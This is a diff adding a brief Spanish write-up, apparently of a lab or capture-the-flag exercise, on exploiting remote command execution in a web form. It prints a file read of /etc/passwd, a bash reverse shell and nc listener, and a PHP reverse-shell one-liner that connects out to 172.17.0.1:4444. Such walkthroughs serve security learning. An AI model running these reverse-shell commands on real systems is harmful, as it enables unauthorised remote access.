@@ -1,0 +1,14 @@
+	Estamos ante un sencillo caso de Ejecución de Comandos Remotos (Remote Command Execution, RCE). Podemos 
+	ver un formulario en el que nos solicita un comando a ejecutar, y como podemos comprobar con un simple
+	"cat /etc/passwd" ejecuta dicho comando. 
+
+	Lo primero que se nos ocurre es lanzar una shell reversa con bash y ponernos en escucha con nc:
+
+	bash -i >& /dev/tcp/172.17.0.1/4444 0>&1
+
+	nc -lnvp 4444
+
+	Pero esto no nos sirve ya que www-data ejecuta la shell /bin/sh y no es compatible con esa sintaxis. Tenemos otra alternativa, 
+	lanzar una shell a través de otra aplicación y la que sabemos que está instalada es "php".
+
+	php -r '$sock=fsockopen("172.17.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
